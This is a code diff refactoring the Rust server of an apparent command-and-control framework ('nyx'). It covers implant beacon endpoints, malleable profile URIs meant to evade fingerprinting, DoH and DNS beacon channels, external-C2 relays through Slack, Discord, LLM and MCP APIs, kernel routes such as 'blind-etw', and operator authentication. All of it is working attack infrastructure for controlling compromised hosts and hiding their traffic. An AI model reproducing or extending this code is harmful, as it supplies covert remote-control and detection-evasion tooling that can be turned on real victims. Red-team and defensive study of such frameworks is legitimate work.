@@ -899,7 +899,20 @@ pub fn router(state: Arc<AppState>) -> Router {
     // the beacon path malleable — the most fingerprinted C2 indicator — without
     // touching crypto. We honour `set verb` (GET/POST) so the registered method
     // matches what the profile says the beacon will use.
-    let extra: Vec<(String, bool)> = state
+    let extra = router_collect_profile_uris(&state);
+    let beacon_routes = router_beacon_routes(&state, extra);
+    let api_routes = router_api_routes(&state);
+    beacon_routes.merge(api_routes).with_state(state)
+}
+
+/// Collect any profile-declared beacon URIs + their `set verb` before `state`
+/// moves into the router. The beacon handler is URI-agnostic (it just
+/// decrypts the body), so serving it at the profile's transaction URIs makes
+/// the beacon path malleable — the most fingerprinted C2 indicator — without
+/// touching crypto. We honour `set verb` (GET/POST) so the registered method
+/// matches what the profile says the beacon will use.
+fn router_collect_profile_uris(state: &AppState) -> Vec<(String, bool)> {
+    state
         .profile
         .as_ref()
         .map(|p| {
@@ -922,35 +935,37 @@ pub fn router(state: Arc<AppState>) -> Router {
             }
             out
         })
-        .unwrap_or_default();
+        .unwrap_or_default()
+}
 
-    // Beacon routes (unauthenticated, crypto-gated). A beacon POST carries
-    // exactly ONE encrypted frame (≤ FRAME_HEADER + MAX_CT_LEN + TAG_LEN ≈ 516
-    // KiB), so BEACON_BODY_LIMIT — the frame ceiling plus 4 KiB of slack —
-    // admits every encodable frame. Keeping it well under the API
-    // limit bounds the pre-auth buffering an attacker can trigger per /beacon
-    // connection (check-in is crypto-gated, not token-gated, by design).
-    // The native DNS beacon (spec-4) POSTs its frame to `/dns` with an
-    // `application/dns-message` flavor; the body is still exactly one encrypted
-    // frame, so it funnels through the same `beacon` handler as `/beacon`.
-    // External C2 endpoints (spec-6). The implant POSTs the raw encrypted frame
-    // to `/extc2/<service>` instead of the real third-party API (Slack/Discord/
-    // LLM/MCP). The body IS the frame — identical to `/beacon` — so these routes
-    // run the same beacon handler to decrypt, queue results, and seal a reply.
-    //
-    // **Slack / LLM / Discord / MCP** routes go through their relay handlers,
-    // which additionally fan the sealed reply out to the real third-party API
-    // via the `nyx-transport` crate's `SlackTransport` / `LlmApiTransport` /
-    // `DiscordTransport` / `McpTransport` (when the operator has configured
-    // the corresponding `NYX_EXTC2_*` vars). That makes the server an actual
-    // external-C2 relay rather than just a URI alias for `/beacon`. When a
-    // channel's relay is unconfigured its route degrades to a plain beacon
-    // endpoint (legacy behaviour).
-    //
-    // `/doh` is the DoH-channel beacon endpoint (spec-2). The DoH channel POSTs
-    // the same encrypted frame as `/beacon` but to `/doh` (CS 4.11 DoH Beacon
-    // alignment — blends with DoH egress by URI while reusing the full
-    // crypto/anti-replay/tasking path). Same body, same `beacon` handler.
+/// Beacon routes (unauthenticated, crypto-gated). A beacon POST carries
+/// exactly ONE encrypted frame (≤ FRAME_HEADER + MAX_CT_LEN + TAG_LEN ≈ 516
+/// KiB), so BEACON_BODY_LIMIT — the frame ceiling plus 4 KiB of slack —
+/// admits every encodable frame. Keeping it well under the API
+/// limit bounds the pre-auth buffering an attacker can trigger per /beacon
+/// connection (check-in is crypto-gated, not token-gated, by design).
+/// The native DNS beacon (spec-4) POSTs its frame to `/dns` with an
+/// `application/dns-message` flavor; the body is still exactly one encrypted
+/// frame, so it funnels through the same `beacon` handler as `/beacon`.
+/// External C2 endpoints (spec-6). The implant POSTs the raw encrypted frame
+/// to `/extc2/<service>` instead of the real third-party API (Slack/Discord/
+/// LLM/MCP). The body IS the frame — identical to `/beacon` — so these routes
+/// run the same beacon handler to decrypt, queue results, and seal a reply.
+///
+/// **Slack / LLM / Discord / MCP** routes go through their relay handlers,
+/// which additionally fan the sealed reply out to the real third-party API
+/// via the `nyx-transport` crate's `SlackTransport` / `LlmApiTransport` /
+/// `DiscordTransport` / `McpTransport` (when the operator has configured
+/// the corresponding `NYX_EXTC2_*` vars). That makes the server an actual
+/// external-C2 relay rather than just a URI alias for `/beacon`. When a
+/// channel's relay is unconfigured its route degrades to a plain beacon
+/// endpoint (legacy behaviour).
+///
+/// `/doh` is the DoH-channel beacon endpoint (spec-2). The DoH channel POSTs
+/// the same encrypted frame as `/beacon` but to `/doh` (CS 4.11 DoH Beacon
+/// alignment — blends with DoH egress by URI while reusing the full
+/// crypto/anti-replay/tasking path). Same body, same `beacon` handler.
+fn router_beacon_routes(state: &AppState, extra: Vec<(String, bool)>) -> Router<Arc<AppState>> {
     let mut beacon_routes = Router::new()
         .route("/beacon", post(beacon))
         .route("/doh", post(beacon))
@@ -976,14 +991,16 @@ pub fn router(state: Arc<AppState>) -> Router {
             beacon_routes.route(&uri, get(beacon))
         };
     }
-    let beacon_routes = beacon_routes.route_layer(DefaultBodyLimit::max(BEACON_BODY_LIMIT));
+    beacon_routes.route_layer(DefaultBodyLimit::max(BEACON_BODY_LIMIT))
+}
 
-    // Control-API routes (operator; token-gated when NYX_TOKEN is set). A larger
-    // cap so hex-encoded Upload/Bof payloads fit (a 2 MB file → ~4 MB of hex in
-    // the JSON body). This layer covers BOTH serving paths — `axum::serve`
-    // (plaintext) and the raw-TLS `serve_connection` in main.rs (no built-in
-    // limit) — because the layer is baked into the Router's service whichever
-    // driver consumes it.
+/// Control-API routes (operator; token-gated when NYX_TOKEN is set). A larger
+/// cap so hex-encoded Upload/Bof payloads fit (a 2 MB file → ~4 MB of hex in
+/// the JSON body). This layer covers BOTH serving paths — `axum::serve`
+/// (plaintext) and the raw-TLS `serve_connection` in main.rs (no built-in
+/// limit) — because the layer is baked into the Router's service whichever
+/// driver consumes it.
+fn router_api_routes(state: &AppState) -> Router<Arc<AppState>> {
     let api_routes = Router::new()
         .route("/api/sessions", get(list_sessions))
         .route("/api/task", post(post_task))
@@ -1011,7 +1028,7 @@ pub fn router(state: Arc<AppState>) -> Router {
     // the bridge is absent, the routes aren't mounted at all — a request to
     // `/api/kernel/*` then gets a plain 404, which is the honest signal that
     // the feature isn't enabled (set NYX_KERNEL_DAEMON=<host:port> to enable).
-    let api_routes = if state.kernel.is_some() {
+    if state.kernel.is_some() {
         api_routes
             .route("/api/kernel/status", get(kernel::driver_status))
             .route("/api/kernel/blind-etw", post(kernel::blind_etw))
@@ -1024,9 +1041,7 @@ pub fn router(state: Arc<AppState>) -> Router {
             )
     } else {
         api_routes
-    };
-
-    beacon_routes.merge(api_routes).with_state(state)
+    }
 }
 
 // ---- implant endpoint ------------------------------------------------------
@@ -1172,11 +1187,16 @@ fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
     let (body, extra) = env.shape_body(&frame);
 
     let mut resp = (StatusCode::OK, body_bytes(body)).into_response();
+    shape_beacon_response_apply_headers(&mut resp, &env.headers);
+    shape_beacon_response_apply_terminator(&mut resp, &env, extra);
+    resp
+}
 
-    // Apply profile-declared response headers. CS `header "N" "V"` sets static
-    // pairs; when the terminator is a header, the transformed bytes go there too.
+/// Apply profile-declared response headers. CS `header "N" "V"` sets static
+/// pairs; when the terminator is a header, the transformed bytes go there too.
+fn shape_beacon_response_apply_headers(resp: &mut Response, headers: &[(Vec<u8>, Vec<u8>)]) {
     use axum::http::HeaderValue;
-    for (name, val) in &env.headers {
+    for (name, val) in headers {
         if let (Ok(n), Ok(v)) = (
             axum::http::HeaderName::from_bytes(name),
             HeaderValue::from_bytes(val),
@@ -1184,13 +1204,21 @@ fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
             resp.headers_mut().insert(n, v);
         }
     }
-    // If the output terminator is a named header, inject the transformed frame
-    // bytes there (overriding any static value for that name). For a Parameter
-    // terminator the bytes can't ride in a query string on a *response* (the
-    // server doesn't control the beacon's request URL), so they go in the body
-    // — the agent inverts them from the body. uri-append is request-side only
-    // (the beacon appends to its own URL), so on the response path it falls back
-    // to the body as well.
+}
+
+/// Apply the profile output terminator on the response path. If the terminator
+/// is a named header, inject the transformed frame bytes there (overriding any
+/// static value for that name). For a Parameter terminator the bytes can't ride
+/// in a query string on a *response* (the server doesn't control the beacon's
+/// request URL), so they go in the body — the agent inverts them from the body.
+/// uri-append is request-side only (the beacon appends to its own URL), so on
+/// the response path it falls back to the body as well.
+fn shape_beacon_response_apply_terminator(
+    resp: &mut Response,
+    env: &nyx_profile::ServerEnvelope,
+    extra: Vec<u8>,
+) {
+    use axum::http::HeaderValue;
     match &env.terminator {
         Some(nyx_profile::Terminator::Header(h)) => {
             if let (Ok(n), Ok(v)) = (
@@ -1213,22 +1241,13 @@ fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
             // The transformed bytes belong in the body for the response path.
             #[allow(clippy::collapsible_match)]
             if !extra.is_empty() {
-                resp = (StatusCode::OK, body_bytes(extra)).into_response();
+                *resp = (StatusCode::OK, body_bytes(extra)).into_response();
                 // Re-apply static headers (the body swap dropped them).
-                use axum::http::HeaderValue;
-                for (name, val) in &env.headers {
-                    if let (Ok(n), Ok(v)) = (
-                        axum::http::HeaderName::from_bytes(name),
-                        HeaderValue::from_bytes(val),
-                    ) {
-                        resp.headers_mut().insert(n, v);
-                    }
-                }
+                shape_beacon_response_apply_headers(resp, &env.headers);
             }
         }
         _ => {}
     }
-    resp
 }
 
 /// Wrap a Vec<u8> as an axum response body.
@@ -1329,11 +1348,20 @@ fn handle_beacon(
     headers: &HeaderMap,
     body: &[u8],
 ) -> anyhow::Result<Vec<u8>> {
-    // Kill date: once reached, refuse all beacon traffic so a burned server goes
-    // dark (checked per-request, not just at boot, so a long-running server
-    // honors it too). Fail CLOSED on a clock error: `unwrap_or(0)` would treat
-    // a pre-epoch / skewed clock as now=0, silently *disabling* the kill date
-    // (0 < kd always passes) — the opposite of safe for a burn-the-server guard.
+    handle_beacon_killdate(st)?;
+    // Invert the profile's client-side request envelope (if any) before parsing.
+    let raw = handle_beacon_unwrap_frame(st, method, headers, body)?;
+    // Delegate to the channel-agnostic core (spec-1). HTTP envelope inversion
+    // happened above; from here on the processing is identical for every channel.
+    handle_frame(st, peer, &raw)
+}
+
+/// Kill date: once reached, refuse all beacon traffic so a burned server goes
+/// dark (checked per-request, not just at boot, so a long-running server
+/// honors it too). Fail CLOSED on a clock error: `unwrap_or(0)` would treat
+/// a pre-epoch / skewed clock as now=0, silently *disabling* the kill date
+/// (0 < kd always passes) — the opposite of safe for a burn-the-server guard.
+fn handle_beacon_killdate(st: &AppState) -> anyhow::Result<()> {
     if let Some(kd) = st.killdate {
         let now = SystemTime::now()
             .duration_since(UNIX_EPOCH)
@@ -1345,12 +1373,21 @@ fn handle_beacon(
             anyhow::bail!("kill date {kd} reached; refusing beacon");
         }
     }
-    // Invert the profile's client-side request envelope (if any) before parsing.
-    // No profile, or a client block with no transform chain → the body IS the raw
-    // frame (identity, zero extra work: parse_frame runs on `body` directly). A
-    // transform chain (base64/mask/...) → pull the transformed bytes from the body
-    // (print/uri-append/none) or the terminator header, then decode.
-    let raw = if let Some(profile) = &st.profile {
+    Ok(())
+}
+
+/// Invert the profile's client-side request envelope (if any) before parsing.
+/// No profile, or a client block with no transform chain → the body IS the raw
+/// frame (identity, zero extra work: parse_frame runs on `body` directly). A
+/// transform chain (base64/mask/...) → pull the transformed bytes from the body
+/// (print/uri-append/none) or the terminator header, then decode.
+fn handle_beacon_unwrap_frame(
+    st: &AppState,
+    method: &Method,
+    headers: &HeaderMap,
+    body: &[u8],
+) -> anyhow::Result<nyx_protocol::RawFrame> {
+    Ok(if let Some(profile) = &st.profile {
         let env = if *method == Method::POST {
             nyx_profile::post_client_envelope(profile)
         } else {
@@ -1389,11 +1426,7 @@ fn handle_beacon(
         }
     } else {
         parse_frame(body)?
-    };
-
-    // Delegate to the channel-agnostic core (spec-1). HTTP envelope inversion
-    // happened above; from here on the processing is identical for every channel.
-    handle_frame(st, peer, &raw)
+    })
 }
 
 /// Resolve session key: determine whether this is a new or existing session,
@@ -2027,42 +2060,55 @@ pub(crate) fn authenticate(st: &AppState, headers: &HeaderMap) -> AuthOutcome {
         .map(|s| s.to_string());
     // (1) Multi-operator registry (loaded from NYX_OPERATORS_FILE / bootstrapped).
     if !st.operators.is_open() {
-        let bearer = bearer_val
-            .as_deref()
-            .and_then(|s| s.strip_prefix("Bearer "));
-        return match bearer {
-            Some(b) => match st.operators.resolve(b) {
-                Some(op) => AuthOutcome::Allowed(op),
-                None => AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response()),
-            },
-            None => AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response()),
-        };
+        return authenticate_operators(st, bearer_val.as_deref());
     }
     // (2) Legacy single shared token.
     if let Some(expected) = &st.api_token {
-        let want = format!("Bearer {expected}");
-        let presented = bearer_val.as_deref().unwrap_or("");
-        // Length check BEFORE the constant-time compare: `presented` is
-        // attacker-controlled (from the Authorization header) and
-        // `subtle::ct_eq` short-circuits on length mismatch, which would
-        // leak `want.len()` as a timing oracle. Reject mismatched lengths
-        // up front so the comparison only ever runs on equal-length slices.
-        if presented.len() != want.len() || !constant_time_eq(want.as_bytes(), presented.as_bytes())
-        {
-            return AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response());
-        }
-        return AuthOutcome::Allowed(operators::OperatorIdentity {
-            name: "_legacy".into(),
-            role: operators::Role::Admin,
-        });
+        return authenticate_legacy_token(expected, bearer_val.as_deref());
     }
     // (3) Open (dev/CI) — NO credentials provided at all.
-    // Security: map to read-only Viewer, NOT Admin. The original Admin mapping
-    // was an RBAC bypass: in open mode any reachable client could POST tasks,
-    // read plaintext creds, revoke implants. With Viewer, the existing
-    // `if op.role == Role::Viewer { 403 }` guards on every write endpoint
-    // close the bypass. For a full-privilege dev/CI session, set
-    // NYX_BOOTSTRAP_OPERATOR or NYX_TOKEN.
+    authenticate_open()
+}
+
+/// (1) Multi-operator registry path: `name:secret` (or bare token → `_legacy`).
+fn authenticate_operators(st: &AppState, bearer_val: Option<&str>) -> AuthOutcome {
+    let bearer = bearer_val.and_then(|s| s.strip_prefix("Bearer "));
+    match bearer {
+        Some(b) => match st.operators.resolve(b) {
+            Some(op) => AuthOutcome::Allowed(op),
+            None => AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response()),
+        },
+        None => AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response()),
+    }
+}
+
+/// (2) Legacy shared `NYX_TOKEN` path (constant-time, identity `_legacy`).
+fn authenticate_legacy_token(expected: &str, bearer_val: Option<&str>) -> AuthOutcome {
+    let want = format!("Bearer {expected}");
+    let presented = bearer_val.unwrap_or("");
+    // Length check BEFORE the constant-time compare: `presented` is
+    // attacker-controlled (from the Authorization header) and
+    // `subtle::ct_eq` short-circuits on length mismatch, which would
+    // leak `want.len()` as a timing oracle. Reject mismatched lengths
+    // up front so the comparison only ever runs on equal-length slices.
+    if presented.len() != want.len() || !constant_time_eq(want.as_bytes(), presented.as_bytes())
+    {
+        return AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response());
+    }
+    AuthOutcome::Allowed(operators::OperatorIdentity {
+        name: "_legacy".into(),
+        role: operators::Role::Admin,
+    })
+}
+
+/// (3) Open mode (identity `_anonymous`) — NO credentials provided at all.
+/// Security: map to read-only Viewer, NOT Admin. The original Admin mapping
+/// was an RBAC bypass: in open mode any reachable client could POST tasks,
+/// read plaintext creds, revoke implants. With Viewer, the existing
+/// `if op.role == Role::Viewer { 403 }` guards on every write endpoint
+/// close the bypass. For a full-privilege dev/CI session, set
+/// NYX_BOOTSTRAP_OPERATOR or NYX_TOKEN.
+fn authenticate_open() -> AuthOutcome {
     tracing::warn!(
         "RBAC open-mode active: anonymous mapped to Viewer (read-only). \
          Set NYX_BOOTSTRAP_OPERATOR or NYX_TOKEN for full-privilege access. \
